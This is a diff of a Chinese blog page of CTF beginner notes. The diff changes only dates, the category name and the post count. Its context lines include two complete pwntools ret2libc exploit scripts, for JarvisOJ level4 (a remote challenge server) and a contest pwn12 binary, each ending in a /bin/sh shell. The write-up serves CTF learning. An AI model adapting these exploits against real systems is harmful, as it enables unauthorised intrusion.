@@ -105,7 +105,7 @@
 <meta property="og:description" content="Linux-x86  JarvisOJ-Pwn-level1  JarvisOJ-Pwn-level2  JarvisOJ-Pwn-level3  JarvisOJ-Pwn-level4  国赛技能赛华东区线下赛 pwn12">
 <meta property="og:locale" content="zh-Hans">
 <meta property="og:image" content="http://yoursite.com/入门笔记/1531318071045.png">
-<meta property="og:updated_time" content="2018-09-06T11:35:30.904Z">
+<meta property="og:updated_time" content="2018-10-05T11:08:38.894Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="入门笔记">
 <meta name="twitter:description" content="Linux-x86  JarvisOJ-Pwn-level1  JarvisOJ-Pwn-level2  JarvisOJ-Pwn-level3  JarvisOJ-Pwn-level4  国赛技能赛华东区线下赛 pwn12">
@@ -332,8 +332,8 @@
               
                 <span class="post-meta-item-text">更新于</span>
               
-              <time title="更新于" itemprop="dateModified" datetime="2018-09-06T19:35:30+08:00">
-                2018-09-06
+              <time title="更新于" itemprop="dateModified" datetime="2018-10-05T19:08:38+08:00">
+                2018-10-05
               </time>
             
           </span>
@@ -351,8 +351,8 @@
               
               
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Binary-safe/" itemprop="url" rel="index">
-                    <span itemprop="name">Binary-safe</span>
+                  <a href="/categories/Binary-security/" itemprop="url" rel="index">
+                    <span itemprop="name">Binary security</span>
                   </a>
                 </span>
 
@@ -413,6 +413,7 @@
 </code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'./level4'</span>)</span><br><span class="line">plt_write = elf.symbols[<span class="string">'write'</span>]</span><br><span class="line">plt_read = elf.symbols[<span class="string">'read'</span>]</span><br><span class="line">got_write = elf.got[<span class="string">'write'</span>]</span><br><span class="line">vulfun_addr = <span class="number">0x0804844B</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">'pwn2.jarvisoj.com'</span>,<span class="number">9880</span>)</span><br><span class="line">payload1 = <span class="string">'a'</span> * <span class="number">0x8c</span> + p32(plt_write) + p32(vulfun_addr) + p32(<span class="number">1</span>) + p32(got_write) + p32(<span class="number">4</span>)</span><br><span class="line">p.send(payload1)</span><br><span class="line">write_addr = hex(u32(p.recv(<span class="number">4</span>)))</span><br><span class="line"></span><br><span class="line">obj = LibcSearcher(<span class="string">"write"</span>,write_addr)</span><br><span class="line">offset_system = obj.dump(<span class="string">"system"</span>)</span><br><span class="line">offset_binsh = obj.dump(<span class="string">"str_bin_sh"</span>)</span><br><span class="line">offset_write = obj.dump(<span class="string">"write"</span>)</span><br><span class="line"></span><br><span class="line">system_addr = write_addr - offset_write + offset_system</span><br><span class="line">binsh_addr = write_addr - offset_write + offset_binsh</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">'a'</span>*<span class="number">0x8c</span> + p32(system_addr) + <span class="string">"aaaa"</span> + p32(binsh_addr)</span><br><span class="line">p.send(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 <h3 id="国赛技能赛华东区线下赛-pwn12"><a href="#国赛技能赛华东区线下赛-pwn12" class="headerlink" title="国赛技能赛华东区线下赛 pwn12"></a>国赛技能赛华东区线下赛 pwn12</h3><pre><code>foo函数里，在gets函数后有一个puts输入内容的函数，要先接收puts的内容才能获得puts的内存地址。
 </code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">'./pwn'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./pwn'</span>)</span><br><span class="line">foo_addr = <span class="number">0x0804859F</span></span><br><span class="line">plt_puts = elf.plt[<span class="string">'puts'</span>]</span><br><span class="line">got_puts = elf.got[<span class="string">'puts'</span>]</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'?\n'</span>)</span><br><span class="line">payload1 = <span class="string">'a'</span>*<span class="number">0x20</span> + p32(plt_puts) + p32(foo_addr) +p32(got_puts)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.recvuntil(p32(got_puts) + <span class="string">'\x0a'</span>)</span><br><span class="line">puts_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> hex(puts_addr)</span><br><span class="line"></span><br><span class="line">obj = LibcSearcher(<span class="string">"puts"</span>,puts_addr)</span><br><span class="line">offset_system = obj.dump(<span class="string">"system"</span>)</span><br><span class="line">offset_puts = obj.dump(<span class="string">"puts"</span>)</span><br><span class="line">offset_sh = obj.dump(<span class="string">"str_bin_sh"</span>)</span><br><span class="line"></span><br><span class="line">system_addr = puts_addr - offset_puts + offset_system</span><br><span class="line">sh_addr = puts_addr - offset_puts + offset_sh</span><br><span class="line">payload2 = <span class="string">'a'</span>*<span class="number">0x20</span> +p32(system_addr) + p32(foo_addr) + p32(sh_addr)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.recvuntil(p32(sh_addr) + <span class="string">'\x0a'</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p>​     </p>
 
       
     </div>
@@ -532,7 +533,7 @@
           
             <div class="site-state-item site-state-posts">
               <a href="/archives">
-                <span class="site-state-item-count">8</span>
+                <span class="site-state-item-count">9</span>
                 <span class="site-state-item-name">日志</span>
               </a>
             </div>
